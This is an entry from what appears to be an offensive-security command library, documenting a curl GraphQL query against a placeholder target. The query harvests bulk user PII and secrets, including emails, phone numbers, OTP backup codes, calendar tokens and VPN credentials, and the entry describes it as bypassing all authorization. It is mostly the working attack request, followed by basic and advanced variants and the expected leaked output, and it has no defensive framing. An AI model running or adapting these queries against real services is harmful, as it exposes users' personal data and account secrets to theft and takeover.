---
id: cmd-uuid-003
data: >-
  curl -X POST https://target.com/graphql -H "Content-Type: application/json" -H
  "Cookie: session=your_session" -d '{"query": "{ id users() { total_count nodes
  { _id name username email account_recovery_phone_number
  account_recovery_unverified_phone_number bounties { total_amount }
  otp_backup_codes i_can_update_username location year_in_review_published_at
  anc_triager blacklisted_from_hacker_publish calendar_token vpn_credentials {
  name } account_recovery_phone_number_sent_at
  account_recovery_phone_number_verified_at swag { total_count } totp_enabled
  subscribed_for_team_messages subscribed_for_monthly_digest sessions {
  total_count } facebook_user_id unconfirmed_email } } }"}'
tags:
  - graphql
  - pii-extraction
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:00.494Z'
verified: false
validated: true
submitted: true
---
# graphql-extensive-user-pii-query

## Command

```bash
curl -X POST https://target.com/graphql -H "Content-Type: application/json" -H "Cookie: session=your_session" -d '{"query": "{ id users() { total_count nodes { _id name username email account_recovery_phone_number account_recovery_unverified_phone_number bounties { total_amount } otp_backup_codes i_can_update_username location year_in_review_published_at anc_triager blacklisted_from_hacker_publish calendar_token vpn_credentials { name } account_recovery_phone_number_sent_at account_recovery_phone_number_verified_at swag { total_count } totp_enabled subscribed_for_team_messages subscribed_for_monthly_digest sessions { total_count } facebook_user_id unconfirmed_email } } }"}'
```

## Description

This command submits an extensive GraphQL query using 'nodes' to extract a wide range of user PII and metadata, including tokens, social IDs, and subscription details, bypassing all authorization.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | POST request method | Yes |
| `-H "Content-Type: application/json"` | JSON format | Yes |
| `-H "Cookie: session=your_session"` | Session authentication | Yes |
| `-d '{...}'` | Full query payload with multiple fields | Yes |
| `nodes { _id name ... unconfirmed_email }` | Comprehensive list of sensitive fields | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://target.com/graphql -H "Content-Type: application/json" -H "Cookie: session=your_session" -d '{"query": "{ users() { nodes { email calendar_token } } }"}'
```

### Advanced Usage

```bash
curl -X POST https://target.com/graphql -H "Content-Type: application/json" -H "Cookie: session=your_session" -d '{"query": "{ users(first: 100) { nodes { email facebook_user_id otp_backup_codes } } }"}'
```

## Expected Output

Large JSON object with {"data":{"users":{"total_count":N,"nodes":[{"_id":"uuid","email":"user@ex.com","calendar_token":"secret","otp_backup_codes":["hash1","hash2"],...}]}}}, containing extensive unscrubbed PII.

## Related

- [[commands/graphql-vulnerable-users-nodes-query]]
- [[procedures/Extract-Sensitive-Metadata-from-Teams-and-Reports]]
